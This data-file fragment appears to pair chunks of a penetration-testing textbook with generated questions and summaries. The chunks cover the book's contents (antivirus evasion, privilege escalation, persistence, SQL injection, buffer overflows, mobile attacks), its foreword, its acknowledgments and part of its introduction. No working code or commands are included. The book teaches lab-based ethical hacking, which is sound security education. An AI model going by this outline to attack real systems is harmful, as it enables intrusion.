Email . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 247\nCreating the Template  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248\nSetting the Target  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248\nSetting Up a Listener  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249\nWeb Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nMass Email Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 253\nMultipronged Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\n12\nBYPassing antiVirus aPPLiCations 257\nTrojans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nMsfvenom  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nHow Antivirus Applications Work  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 260\nMicrosoft Security Essentials  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\nVirusTotal  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nGetting Past an Antivirus Program  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nEncoding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nCustom Cross Compiling  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266\nEncrypting Executables with Hyperion . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269\nEvading Antivirus with Veil-Evasion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 270\nxiv Contents in Detail\nHiding in Plain Sight . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274\n13\nPost exPLoitation 277\nMeterpreter . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nUsing the upload Command . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\ngetuid  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\nOther Meterpreter Commands  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nMeterpreter Scripts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nMetasploit Post-Exploitation Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\nRailgun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nLocal Privilege Escalation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\ngetsystem on Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nLocal Escalation Module for Windows . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nBypassing UAC on Windows . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285\nUdev Privilege Escalation on Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nLocal Information Gathering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nSearching for Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nKeylogging  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292\nGathering Credentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292\nnet Commands . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 294\nAnother Way In  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295\nChecking Bash History . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295\nLateral Movement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296\nPSExec . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296\nPass the Hash  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298\nSSHExec  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 299\nToken Impersonation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 300\nIncognito  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 301\nSMB Capture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 302\nPivoting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 304\nAdding a Route in Metasploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nMetasploit Port Scanners  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306\nRunning an Exploit through a Pivot  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306\nSocks4a and ProxyChains  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 307\nPersistence  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 309\nAdding a User  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 309\nMetasploit Persistence  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 310\nCreating a Linux cron Job . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 311\nSummary  . . . . . . . . . . . . . . .",
    "question": "What are the key methods and tools discussed for payload creation, execution, and evasion in the context of ethical hacking and penetration testing?",
    "summary": "The text covers the use of Metasploit and Msfvenom for creating and handling payloads, including different types of shells and methods for evading detection. It also discusses information gathering techniques like OSINT, port scanning, and vulnerability scanning with tools such as Nmap and Nessus. Additionally, it explores client-side exploitation, social engineering, bypassing antivirus software, and post-exploitation activities including privilege escalation, lateral movement, and persistence strategies."
  },
  {
    "start": 8,
    "end": 10,
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 311\n14\nweB aPPLiCation testing 313\nUsing Burp Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 314\nSQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319\nTesting for SQL Injection Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . 320\nExploiting SQL Injection Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\nUsing SQLMap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\nXPath Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 323\nContents in Detail xv\nLocal File Inclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324\nRemote File Inclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\nCommand Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\nCross-Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 329\nChecking for a Reflected XSS Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . 330\nLeveraging XSS with the Browser Exploitation Framework  . . . . . . . . . . . . . . 331\nCross-Site Request Forgery  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335\nWeb Application Scanning with w3af  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 337\n15\nwireLess attaCks 339\nSetting Up . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339\nViewing Available Wireless Interfaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . 340\nScan for Access Points . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nMonitor Mode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nCapturing Packets  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 342\nOpen Wireless  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343\nWired Equivalent Privacy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343\nWEP Weaknesses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 346\nCracking WEP Keys with Aircrack-ng  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347\nWi-Fi Protected Access  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 350\n\nWPA2  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Enterprise Connection Process  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Personal Connection Process  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Four-Way Handshake  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352\nCracking WPA/WPA2 Keys  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353\nWi-Fi Protected Setup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356\nProblems with WPS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356\nCracking WPS with Bully . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357\nPart iV\nexPLoit deVeLoPment\n16\na staCk-Based BuFFer oVerFLow in Linux 361\nMemory Theory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\nLinux Buffer Overflow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 364\nA Vulnerable Program  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 365\nCausing a Crash . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366\nRunning GDB  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 367\nCrashing the Program in GDB  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372\nxvi Contents in Detail\nControlling EIP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373\nHijacking Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375\nEndianness . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 376\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\n17\na staCk-Based BuFFer oVerFLow in windows 379\nSearching for a Known Vulnerability in War-FTP  . . . . . . . . . . . . . . . . . . . . . . . . . . . 380\nCausing a Crash  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 382\nLocating EIP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384\nGenerating a Cyclical Pattern to Determine Offset . . . . . . . . . . . . . . . . . . . . 385\nVerifying Offsets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 388\nHijacking Execution  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390\nGetting a Shell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 395\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 400\n18\nstruCtured exCePtion handLer oVerwrites 401\nSEH Overwrite Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 403\nPassing Control to SEH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 407\nFinding the Attack String in Memory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 408\n\nPOP POP RET  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 411\nSafeSEH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 412\nUsing a Short Jump  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 416\nChoosing a Payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 418\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 419\n19\nFuzzing, Porting exPLoits, and metasPLoit moduLes 421\nFuzzing Programs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 421\nFinding Bugs with Code Review  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422\nFuzzing a Trivial FTP Server  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422\nAttempting a Crash . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424\nPorting Public Exploits to Meet Your Needs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 427\nFinding a Return Address . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 429\nReplacing Shellcode  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430\nEditing the Exploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430\nWriting Metasploit Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 432\nA Similar Exploit String Module  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 435\nPorting Our Exploit Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 435\nExploitation Mitigation Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 439\nStack Cookies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 440\nAddress Space Layout Randomization  . . . . . . . . . . . . . . . . . . . . . . . . . . . 440\nData Execution Prevention  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441\nMandatory Code Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 442\nContents in Detail xvii\nPart V\nMobile Hacking\n20\nUsing tHe sMartPHone Pentest FraMework 445\nMobile Attack Vectors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nText Messages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nNear Field Communication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nQR Codes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nThe Smartphone Pentest Framework  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nSetting Up SPF  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nAndroid Emulators . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nAttaching a Mobile Modem  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nBuilding the Android App  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nDeploying the App  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450\nAttaching the SPF Server and App . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 452\nRemote Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 453\nDefault iPhone SSH Login  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 453\nClient-Side Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454\nClient-Side Shell  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454\nUSSD Remote Control  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 456\nMalicious Apps  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 458\nCreating Malicious SPF Agents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 459\nMobile Post Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 464\nInformation Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 464\nRemote Control . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 465\nPivoting Through Mobile Devices  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 466\nPrivilege Escalation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 471\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 472\nresoUrces 473\nindex 477\nxviii Contents in Detail\nfore worD\nI met Georgia Weidman at a conference almost two\nyears ago. Intrigued by what she was doing in the\nmobile device security field, I started following her\nwork. At nearly every conference I’ve attended since\nthen, I’ve run into Georgia and found her passion-\nately sharing knowledge and ideas about mobile\ndevice security and her Smartphone Pentesting\nFramework. In fact, mobile device security is only one of the things Georgia does. Georgia performs penetration tests for a living; travels the world to deliver\ntraining on pentesting, the Metasploit Framework, and mobile device secu-\nrity; and presents novel and innovative ideas on how to assess the security of\nmobile devices at conferences. Georgia spares no effort in diving deeper into more advanced top-\nics and working hard to learn new things. She is a former student of my\n(rather challenging) Exploit Development Bootcamp, and I can attest to\nthe fact that she did very well throughout the entire class. Georgia is a true\nhacker—always willing to share her findings and knowledge with our great\ninfosec community—and when she asked me to write the foreword to this\nbook, I felt very privileged and honored. As a chief information security officer, a significant part of my job\nrevolves around designing, implementing, and managing an information\nsecurity program. Risk management is a very important aspect of the pro-\ngram because it allows a company to measure and better understand its\ncurrent position in terms of risk. It also allows a company to define priori-\nties and implement measures to decrease risk to an acceptable level, based\non the company’s core business activities, its mission and vision, and legal\nrequirements. Identifying all critical business processes, data, and data flows inside\na company is one of the first steps in risk management. This step includes\ncompiling a detailed inventory of all IT systems (equipment, networks,\napplications, interfaces, and so on) that support the company’s critical busi-\nness processes and data from an IT perspective. The task is time consuming\nand it’s very easy to forget about certain systems that at first don’t seem to\nbe directly related to supporting critical business processes and data, but\nthat are nonetheless critical because other systems depend on them. This\ninventory is fundamentally important and is the perfect starting point for a\nrisk-assessment exercise. One of the goals of an information-security program is to define what\nis necessary to preserve the desired level of confidentiality, integrity, and\navailability of a company’s IT systems and data. Business process owners\nshould be able to define their goals, and our job as information-security\nprofessionals is to implement measures to make sure we meet these goals\nand to test how effective these measures are.",
    "question": "What is the main focus of the text provided?",
    "summary": "The text discusses web application testing techniques, including using Burp Proxy, identifying and exploiting SQL injection and XSS vulnerabilities, and cracking wireless security protocols like WEP and WPA2. It also covers exploit development, such as stack-based buffer overflows and structured exception handler overwrites, along with methods for fuzzing, porting exploits, and creating Metasploit modules. Finally, it addresses mobile hacking, focusing on tools like the Smartphone Pentest Framework and various attack vectors on smartphones."
  },
  {
    "start": 11,
    "end": 16,
    "text": "There are a few ways to determine the actual risk to the confidentiality,\nintegrity, and availability of a company’s systems. One way is to perform a\ntechnical assessment to see how easy it would be for an adversary to under-\nmine the desired level of confidentiality, break the integrity of systems, and\ninterfere with the availability of systems, either by attacking them directly\nor by attacking the users with access to these systems. That’s where a penetration tester (pentester, ethical hacker, or what-\never you want to call it) comes into play. By combining knowledge of how\nsystems are designed, built, and maintained with a skillset that includes\nfinding creative ways around defenses, a good pentester is instrumental in\nidentifying and demonstrating the strength of a company’s information-\nsecurity posture. If you would like to become a penetration tester or if you are a systems/\nnetwork administrator who wants to know more about how to test the\nsecurity of your systems, this book is perfect for you. You’ll learn some of\nthe more technical phases of a penetration test, beginning with the initial\ninformation-gathering process. You’ll continue with explanations of how to\nexploit vulnerable networks and applications as you delve deeper into the\nnetwork in order to determine how much damage could be done. This book is unique because it’s not just a compilation of tools with\na discussion of the available options. It takes a very practical approach,\nxx Foreword\ndesigned around a lab—a set of virtual machines with vulnerable applica-\ntions—so you can safely try various pentesting techniques using publicly\navailable free tools. Each chapter starts with an introduction and contains one or more\nhands-on exercises that will allow you to better understand how vulner-\nabilities can be discovered and exploited. You’ll find helpful tips and tricks\nfrom an experienced professional pentester, real-life scenarios, proven tech-\nniques, and anecdotes from actual penetration tests. Entire books can be written (and have been) on the topics covered in\neach chapter in this book, and this book doesn’t claim to be the Wikipedia\nof pentesting. That said, it will certainly provide you with more than a first\npeek into the large variety of attacks that can be performed to assess a tar-\nget’s security posture. Thanks to its guided, hands-on approach, you’ll learn\nhow to use the Metasploit Framework to exploit vulnerable applications and\nuse a single hole in a system’s defenses to bypass all perimeter protections,\ndive deeper into the network, and exfiltrate data from the target systems. You’ll learn how to bypass antivirus programs and perform efficient social-\nengineering attacks using tools like the Social-Engineer Toolkit. You’ll see\nhow easy it would be to break into a corporate Wi-Fi network, and how to use\nGeorgia’s Smartphone Pentest Framework to assess how damaging a com-\npany’s bring your own device policy (or lack thereof) could be. Each chap-\nter is designed to trigger your interest in pentesting and to provide you with\nfirst-hand insight into what goes on inside a pentester’s mind. I hope this book will spark your creativity and desire to dive deeper into\ncertain areas; to work hard and learn more; and to do your own research\nand share your knowledge with the community. As technology develops,\nenvironments change, and companies increasingly rely on technology\nto support their core business activities, the need for smart pentesters\nwill increase. You are the future of this community and the information-\nsecurity industry. Good luck taking your first steps into the exciting world of pentesting. I’m sure you will enjoy this book! Peter “corelanc0d3r” Van Eeckhoutte\nFounder of Corelan Team\nForeword xxi\naCknowleDgments\nMany thanks go to the following people and organizations (in no particular\norder). My parents, who have always supported my career endeavors—including\npaying for me to go to my first conference and get my first certifications when\nI was still a broke college student. Collegiate Cyber Defense Competition, particularly the Mid-Atlantic\nregion Red Team, for helping me find what I wanted to do with my life. ShmooCon for accepting my first talk ever and also being the first con-\nference I ever attended. Peiter “Mudge” Zatko and everyone who involved in the DARPA Cyber\nFast Track program for giving me the opportunity to start my own company\nand build the Smartphone Pentest Framework. James Siegel for being my lucky charm and making sure I get on stage\non time at events. Rob Fuller for taking the time to come to James Madison University\nand visit the CCDC team after the competition. That day I decided to make\na career of infosec. John Fulmer for helping me with the crypto details in the wireless chapter. Rachel Russell and Micheal Cottingham for being my first infosec buddies. Jason and Rachel Oliver for technical and content review, and also for\nmaking the perfect smoky eye look at ShmooCon and Black Hat. Joe McCray, my infosec big brother, for being my mentor as I learn to\nnavigate the infosec business. Leonard Chin for giving me my first big international conference expe-\nrience and the confidence to become a conference trainer. Brian Carty for helping me build my online lab. Tom Bruch for letting me live in his house when I had no job and my\nDARPA money hadn’t come through yet. Dave Kennedy for providing introductions for several great opportunities. Grecs for helping me market my classes on his website. Raphael Mudge for getting me in touch with the DARPA Cyber Fast\nTrack program and many other great opportunities. Peter Hesse and Gene Meltser for forcing me to have the courage to\nmove up at key junctures in my career. Jayson Street for being a pickier eater than me so I almost pass as nor-\nmal at speaker dinners in foreign countries. You are the best. Ian Amit for recommending me for some great speaking slots when I\nwas just starting out. Martin Bos for being awesome. You know what I mean. Jason Kent for all those global premier upgrades and wonderful tau-\ntologies for definitions, some of which appear herein. My professors at James Madison University, particularly Samuel T. Redwine—you inspired me more than you will ever know. The people at No Starch Press for their help and support in developing\nthis book, including Alison Law, Tyler Ortman, and KC Crowell. Special\nthanks to my editor and No Starch’s publisher, Bill Pollock. xxiv Acknowledgments\nintroDuCtion\nI decided to write this book because it was the sort\nof book I wish I had had when I was starting out in\ninformation security. Though there are certainly\nmore informative websites out there than when I\nfirst started, I still find it’s difficult for a beginner to\nknow what to read first and where to get the expected prerequisite skills. Likewise, there are a lot of books on the market—several great ones on\nadvanced topics, which require some background knowledge, and many\ngood books aimed at beginners, which cover a significant amount of theory. But I haven’t found anything that says everything I want to say to the aspiring\npentester who emails me looking for a place to start in information security. In my teaching career I’ve always found that my favorite course to\nteach is Introduction to Pentesting. The students always have a thirst for\nknowledge that is lots of fun to be around. Thus, when I was approached\nby No Starch Press to write a book, this was the book I proposed. When I\nannounced it, many people assumed I was writing a mobile security book,\nbut while I considered that, I thought an introduction to pentesting would\nmake the biggest impact on the audience I most wanted to reach. a note of thanks\nA book like this would not be possible without many years of dedicated\nwork on the part of the information security community. The tools and\ntechniques discussed throughout this book are some of the ones my col-\nleagues and I use regularly on engagements, and they’ve been developed\nthrough the combined efforts of pentesters and other security experts all\nover the world. I’ve contributed to some of these open source projects (such\nas Mona.py, which we’ll use in the exploit development chapters), and I hope\nthis book will inspire you to do the same. I want to take this opportunity to thank Offensive Security for creating\nand maintaining the Kali Linux pentesting distribution used widely in the\nfield and throughout this book. A huge amount of credit also goes to the\ncore developers of the Metasploit Framework, as well as its numerous com-\nmunity contributors. Thanks too to all the pentesters and researchers who\nhave shared their knowledge, discoveries, and techniques with the com-\nmunity so that we can use them to assess the security posture of our clients\nmore effectively, and so that teachers like me can use them with our students. Thanks as well to the creators of the great books, blog posts, courses,\nand so on that have helped me achieve my goal of becoming a professional\npentester. I now hope to share the knowledge I’ve gained with other aspir-\ning pentesters. You’ll find a list of additional resources (including courses and blogs)\nat the end of this book. These are some of the resources that I have found\nhelpful on my own journey in infosec, and I encourage you to use them to\nlearn more about the many penetration testing topics covered in this book. I hope you enjoy your journey as much as I have. about this Book\nTo work through this book, you will need to know how to install software\non your computer. That’s it. You don’t need to be a Linux expert or know\nthe nitty-gritty of how networking protocols work. When you encounter\na topic that is not familiar to you, I encourage you to do some outside\nresearch beyond my explanations if you need to—but we will walk step-by-\nstep through all the tools and techniques that may be new to you, starting\nwith the Linux command line. When I started in information security, the\nclosest thing I’d ever done to hacking was making the Windows XP pre-SP2\nStart menu say Georgia instead of Start. And I was pretty proud of myself at\nthe time. And then I went to the Collegiate Cyber Defense Competition and all\nthe Red Team members were using the command line at rapid speed and\nmaking pop-up windows appear on my desktop from across a crowded\nroom. All I knew was that I wanted to be like them. There was a lot of hard\nwork between then and now, and there will be much more hard work as I\nendeavor to reach the highest level of information security. I only hope that\nwith this book I can inspire more people to follow the same path. xxvi Introduction\nPart I: The Basics\nIn Chapter 0, we start out with some basic definitions of the phases of pene-\ntration testing. In Chapter 1, we build our small practice laboratory, which we\nwill use to work through the exercises in this book. With many books, it’s pos-\nsible to just download a few programs onto your existing platform, but to sim-\nulate a penetration test, our approach is a bit more involved. I recommend\nthat you take the time to set up your lab and work through the hands-on\nexamples with me. Though this book can serve as a reference and reminder\nin the field, I believe it is best to first practice your pentesting skills at home. In Chapter 2, we start with the basics of using Kali Linux and Linux\noperating systems in general. Next, Chapter 3 covers the basics of program-\nming. Some readers may already have a working knowledge in these areas\nand can skip past them. When I first started out, I had some programming\nexperience in C and Java, but I didn’t have a background in scripting, and\nI had practically no background in Linux—a skillset that was assumed by\nmost of the hacking tutorials I encountered. Thus, I have provided a primer\nhere. If you are new to these areas, please do continue your studies outside\nof this book. Linux-based operating systems are becoming more and more\nprevalent as the platforms for mobile devices and web services, so skills in\nthis area will benefit you even if you don’t pursue a career in information\nsecurity. Likewise, knowing how to script your common tasks can only make\nyour life easier, regardless of your career. We look at the basics of using the Metasploit Framework, a tool we will\nleverage throughout this book, in Chapter 4. Though we will also learn to\nperform many tasks without Metasploit, it is a go-to tool for many pentest-\ners in the field and is constantly evolving to include the latest threats and\ntechniques. Part II: Assessments\nNext we start working through a simulated penetration test. In Chapter 5,\nwe begin by gathering data about our target—both by searching freely\navailable information online and by engaging our target systems. We then\nstart searching for vulnerabilities using a combination of querying the sys-\ntems and research in Chapter 6. In Chapter 7, we look at techniques to cap-\nture traffic that might include sensitive data. Part III: Attacks\nNext, in Chapter 8, we look at exploiting the vulnerabilities we found on\nthe network with a variety of tools and techniques, including Metasploit and\npurely manual exploitation. We then look at methods for attacking what is\noften the weakest link in a network’s security—password management—in\nChapter 9. We next look at some more advanced exploitation techniques. Not\nall vulnerabilities are in a service listening on the network. Web browsers,\nPDF readers, Java, Microsoft Office—they all have been subject to security\nissues. As clients work harder to secure their networks, attacking client-\nside software may be the key to getting a foothold in the network. We look\nIntroduction xxvii\nat leveraging client-side attacks in Chapter 10. In Chapter 11, we combine\nclient-side attacks with a look at social engineering, or attacking the human\nelement—the part of the environment that 